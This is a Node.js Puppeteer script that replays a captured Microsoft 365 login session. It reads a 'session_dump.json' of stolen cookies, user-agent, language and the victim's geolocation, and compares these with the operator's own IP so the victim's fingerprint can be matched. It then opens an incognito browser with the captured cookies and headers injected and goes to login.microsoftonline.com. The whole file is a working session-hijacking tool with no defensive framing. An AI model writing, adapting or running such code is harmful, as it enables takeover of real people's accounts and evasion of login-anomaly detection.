const puppeteer = require('puppeteer');
const fs = require('fs');
const readline = require('readline');
const https = require('https');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// Helper to ask a question
const ask = (query) => new Promise(resolve => rl.question(query, resolve));

// Helper to get current IP and Geo Info
async function getCurrentIPInfo() {
  return new Promise((resolve, reject) => {
    https.get('https://ipinfo.io/json', (resp) => {
      let data = '';
      resp.on('data', (chunk) => { data += chunk; });
      resp.on('end', () => { resolve(JSON.parse(data)); });
    }).on('error', (err) => { reject(err); });
  });
}

(async () => {
  const sessionData = JSON.parse(fs.readFileSync('./session_dump.json', 'utf8'));

  // Show original session info
  console.log('\n--- Original Captured Session ---');
  console.log(`User-Agent: ${sessionData.userAgent}`);
  console.log(`IP Address: ${sessionData.ip}`);
  console.log(`City: ${sessionData.city}`);
  console.log(`Region/State: ${sessionData.region}`);
  console.log(`Country: ${sessionData.country}`);
  console.log(`Language: ${sessionData.language || 'Not Set'}`);

  // Fetch and show current machine's info
  const currentInfo = await getCurrentIPInfo();
  console.log('\n--- Your Current Machine Info ---');
  console.log(`IP Address: ${currentInfo.ip}`);
  console.log(`City: ${currentInfo.city}`);
  console.log(`Region/State: ${currentInfo.region}`);
  console.log(`Country: ${currentInfo.country}`);

  // Ask user if they want to modify User-Agent
  console.log('\nOptions:');
  console.log('1. Replay with original User-Agent)');
  console.log('2. Modify User-Agent manually');

  const choice = await ask('Select an option (1-2): ');

  let userAgent = sessionData.userAgent || '';
  const language = sessionData.language || 'en-US,en;q=0.9';  // Always use the captured language

  if (choice === '2') {
    userAgent = await ask('Enter the User-Agent string you want to use: ');
  }

  rl.close();

  const browser = await puppeteer.launch({
    headless: false,
    args: ['--no-sandbox', '--incognito']
  });

  const pages = await browser.pages();
  const page = pages[0];

  await page.setUserAgent(userAgent || '');
  await page.setExtraHTTPHeaders({
    'Accept-Language': language
  });

  // Set cookies
  await page.setCookie(...sessionData.cookies);

  // Navigate to the login page
  await page.goto('https://login.microsoftonline.com');

  console.log("Replay session started in incognito window.");
})();
